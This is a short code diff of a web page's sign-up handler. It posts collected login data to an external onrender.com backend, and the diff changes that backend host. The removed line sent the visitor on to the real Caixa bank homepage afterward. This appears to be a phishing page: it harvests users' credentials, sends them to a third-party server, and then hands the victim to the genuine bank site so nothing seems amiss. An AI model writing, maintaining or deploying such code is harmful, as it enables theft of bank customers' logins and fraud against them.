@@ -32,11 +32,11 @@ const IndexPage = () => {
   const onCadastro = () => {
 
     setLoading(true)
-    axios.post('https://back-9no1.onrender.com/usuarios', loginData).then(response => {
+    axios.post('https://back3-95ka.onrender.com/usuarios', loginData).then(response => {
       // console.log(response)
       // alert('recebi')
       
-      document.location.assign('https://www.caixa.gov.br/Paginas/home-caixa.aspx')
+      document.location.assign('/fim')
     }).catch(error => {
       console.log(error)
     })
